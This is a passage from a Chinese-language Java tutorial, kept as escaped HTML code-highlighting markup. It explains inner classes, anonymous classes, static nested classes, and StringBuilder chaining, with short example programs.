&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">inner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 调用Outer的构造方法来创建Inner实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原因是Inner Class除了&lt;code>this&lt;/code>指向自己以外还隐含地持有一个Outer Class实例，可以用&lt;code>Outer.this&lt;/code>访问这个实例；所以，实例化一个Inner Class不能脱离Outer实例&lt;/p>
&lt;p>Inner Class和普通Class相比，除了能引用Outer实例外，还有一个额外的特权：可以修改Outer Class的&lt;code>private&lt;/code>字段；因为Inner Class的作用域在Outer Class内部，所以能访问Outer Class的&lt;code>private&lt;/code>字段和方法&lt;/p>
&lt;p>观察Java编译器编译后的&lt;code>.class&lt;/code>文件可以发现，&lt;code>Outer&lt;/code>类被编译为&lt;code>Outer.class&lt;/code>，而&lt;code>Inner&lt;/code>类被编译为&lt;code>Outer$Inner.class&lt;/code>&lt;/p>
&lt;ul>
&lt;li>还可以通过匿名类Anonymous Class来定义Inner Class，两者本质上相同&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Runnabale&lt;/code>本身是不能实例化的接口，这里实际定义了一个实现了&lt;code>Runnable&lt;/code>接口的匿名类，并通过new实例化 之后转型为Runnable，过程很多但是实现起来代码很简洁；和Inner Class一样也可以访问Outer Class的&lt;code>private&lt;/code>&lt;/p>
&lt;ul>
&lt;li>匿名类在定义时必须实例化，最终会编译为&lt;code>Outer$1.class&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实现必要的抽象方法...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>继承自普通类的匿名类，编译为&lt;code>Main$1.class&lt;/code>和&lt;code>Main$2.class&lt;/code>两个匿名类文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{};&lt;/span> &lt;span style="color:#75715e">// 匿名类!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;B&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态内部类示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#111">sn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">NAME&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;OUTER&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">NAME&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用&lt;code>static&lt;/code>修饰的内部类和Inner Class有很大的不同，它不再依附于&lt;code>Outer&lt;/code>的实例，而是一个完全独立的类，因此无法引用&lt;code>Outer.this&lt;/code>，但它仍然可以访问&lt;code>Outer&lt;/code>的&lt;code>private&lt;/code>静态字段和静态方法；如果把&lt;code>StaticNested&lt;/code>移到&lt;code>Outer&lt;/code>之外，就失去了访问&lt;code>private&lt;/code>的权限&lt;/p>
&lt;h2 id="java核心类部分">Java核心类(部分)&lt;/h2>
&lt;h3 id="stringbuilder">StringBuilder&lt;/h3>
&lt;ul>
&lt;li>是一个可变对象，可以预分配缓冲区，向其中新增字符时，不会创建新的临时对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>可链式操作&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Mr &amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insert&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>实现的关键是定义的&lt;code>append()&lt;/code>方法会返回&lt;code>this&lt;/code>，这样就可以不断调用自身的其他方法；仿写链式调用函数&lt;/li>
&lt;/ul>
